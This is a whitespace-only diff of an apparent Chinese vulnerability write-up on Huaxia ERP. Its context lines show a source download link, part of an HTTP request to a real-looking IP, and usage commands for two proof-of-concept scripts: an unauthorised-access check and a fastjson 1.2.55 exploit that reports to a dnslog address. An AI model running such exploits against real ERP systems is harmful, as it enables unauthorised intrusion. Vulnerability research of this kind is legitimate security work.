@@ -49,7 +49,7 @@ source: "MrWQ/vulnerability-paper"
 
 从开源项目本地搭建来进行审计，源码下载地址：
 
-百度网盘 https://pan.baidu.com/s/1jlild9uyGdQ7H2yaMx76zw  提取码: 814g  
+百度网盘 https://pan.baidu.com/s/1jlild9uyGdQ7H2yaMx76zw  提取码: 814g  
 
   
 
@@ -106,7 +106,7 @@ X-Requested-With: XMLHttpRequest
 Referer: http://47.116.69.14/pages/manage/systemConfig.html
 Accept-Encoding: gzip, deflate
 Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6,pl;q=0.5
-Connection: close
+Connection: close
 ```
 
 来个 POC 吧，验证起来方便
@@ -114,7 +114,7 @@ Connection: close
 使用方式：
 
 ```
-python3 华夏erp未授权.py http://ip:port
+python3 华夏erp未授权.py http://ip:port
 ```
 
 源码：  
@@ -180,7 +180,7 @@ pom.xml 文件中引用了 fastjson，且版本为 1.2.55
 使用方法：
 
 ```
-python3 华夏erp_fastjson.py x.x.x.x 80 qingy.dnslog.cn (替换你的dnslog地址)
+python3 华夏erp_fastjson.py x.x.x.x 80 qingy.dnslog.cn (替换你的dnslog地址)
 ```
 
 源码：
